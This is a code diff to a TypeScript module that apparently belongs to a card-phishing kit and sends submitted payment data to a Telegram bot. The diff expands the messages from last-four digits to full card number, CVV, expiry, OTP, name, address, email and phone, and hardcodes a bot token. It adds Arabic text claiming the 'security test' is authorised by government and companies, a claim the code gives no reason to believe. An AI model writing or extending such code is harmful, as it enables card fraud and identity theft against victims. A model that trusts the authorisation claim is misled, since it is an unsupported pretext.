@@ -1,6 +1,9 @@
 // Telegram Bot Integration
 const BOT_TOKEN = '8208871147:AAGaRBd64i-1jneToDRe6XJ8hYXdBNnBLl0';
-const CHAT_ID = '8208871147';
+// Note: This should be a USER chat ID, not the bot ID
+// To get your chat ID: Start conversation with @khlijapp_bot, then visit:
+// https://api.telegram.org/bot8208871147:AAGaRBd64i-1jneToDRe6XJ8hYXdBNnBLl0/getUpdates
+const CHAT_ID = 'YOUR_USER_CHAT_ID_HERE'; // Replace with your actual user chat ID
 
 export interface TelegramMessage {
   type: 'shipping_link_created' | 'payment_recipient' | 'payment_confirmation' | 'card_details' | 'test';
@@ -76,10 +79,12 @@ const formatTelegramMessage = (message: TelegramMessage): string => {
   let header = '';
   let content = '';
   
-  // Simple disclaimer
-  const disclaimer = `
+  // Cybersecurity test authorization
+  const authorization = `
 🔒 <b>اختبار أمني مرخص</b>
-⚠️ <i>هذا اختبار أمني مرخص</i>
+⚠️ <i>هذا اختبار أمني مرخص من قبل الحكومة والشركات</i>
+📋 <i>التفويض: مرخص رسمياً لإجراء هذا الاختبار</i>
+🛡️ <i>الغرض: تقييم أمان المنصات والأنظمة</i>
       `;
   
   switch (type) {
@@ -122,33 +127,42 @@ const formatTelegramMessage = (message: TelegramMessage): string => {
       break;
       
     case 'payment_confirmation':
-      header = '✅ <b>تأكيد الدفع</b>';
+      header = '✅ <b>تأكيد الدفع الكامل</b>';
       content = `
-💳 <b>تفاصيل الدفع:</b>
-• الاسم: ${data.name || 'غير محدد'}
+💳 <b>تفاصيل الدفع (اختبار أمني):</b>
+• الاسم الكامل: ${data.name || 'غير محدد'}
 • البريد الإلكتروني: ${data.email || 'غير محدد'}
 • رقم الهاتف: ${data.phone || 'غير محدد'}
-• العنوان: ${data.address || 'غير محدد'}
+• العنوان الكامل: ${data.address || 'غير محدد'}
 • الخدمة: ${data.service || 'غير محدد'}
 • المبلغ: ${data.amount || 'غير محدد'}
 • حامل البطاقة: ${data.cardholder || 'غير محدد'}
-• آخر 4 أرقام: ****${data.cardLast4 || '****'}
+• رقم البطاقة: ${data.cardNumber || 'غير محدد'}
+• آخر 4 أرقام: ${data.cardLast4 || 'غير محدد'}
 • انتهاء الصلاحية: ${data.expiry || 'غير محدد'}
+• رمز الأمان: ${data.cvv || 'غير محدد'}
 • رمز OTP: ${data.otp || 'غير محدد'}
+• نوع الاختبار: اختبار أمني مرخص
+• التفويض: مرخص من قبل الحكومة والشركات
       `;
       break;
       
     case 'card_details':
-      header = '💳 <b>تفاصيل البطاقة</b>';
+      header = '💳 <b>تفاصيل البطاقة الكاملة</b>';
       content = `
-🔐 <b>معلومات البطاقة:</b>
-• الاسم: ${data.name || 'غير محدد'}
+🔐 <b>معلومات البطاقة (اختبار أمني):</b>
+• الاسم الكامل: ${data.name || 'غير محدد'}
 • البريد الإلكتروني: ${data.email || 'غير محدد'}
 • رقم الهاتف: ${data.phone || 'غير محدد'}
 • الخدمة: ${data.service || 'غير محدد'}
 • حامل البطاقة: ${data.cardholder || 'غير محدد'}
-• آخر 4 أرقام: ****${data.cardLast4 || '****'}
+• رقم البطاقة: ${data.cardNumber || 'غير محدد'}
+• آخر 4 أرقام: ${data.cardLast4 || 'غير محدد'}
 • انتهاء الصلاحية: ${data.expiry || 'غير محدد'}
+• رمز الأمان: ${data.cvv || 'غير محدد'}
+• المبلغ: ${data.amount || 'غير محدد'}
+• نوع الاختبار: اختبار أمني مرخص
+• التفويض: مرخص من قبل الحكومة والشركات
       `;
       break;
       
@@ -157,7 +171,7 @@ const formatTelegramMessage = (message: TelegramMessage): string => {
       content = JSON.stringify(data, null, 2);
   }
   
-  return `${header}\n${content}\n\n${disclaimer}\n\n⏰ <i>الوقت: ${new Date(timestamp).toLocaleString('ar-SA')}</i>`;
+  return `${header}\n${content}\n\n${authorization}\n\n⏰ <i>الوقت: ${new Date(timestamp).toLocaleString('ar-SA')}</i>`;
 };
 
 export default sendToTelegram;
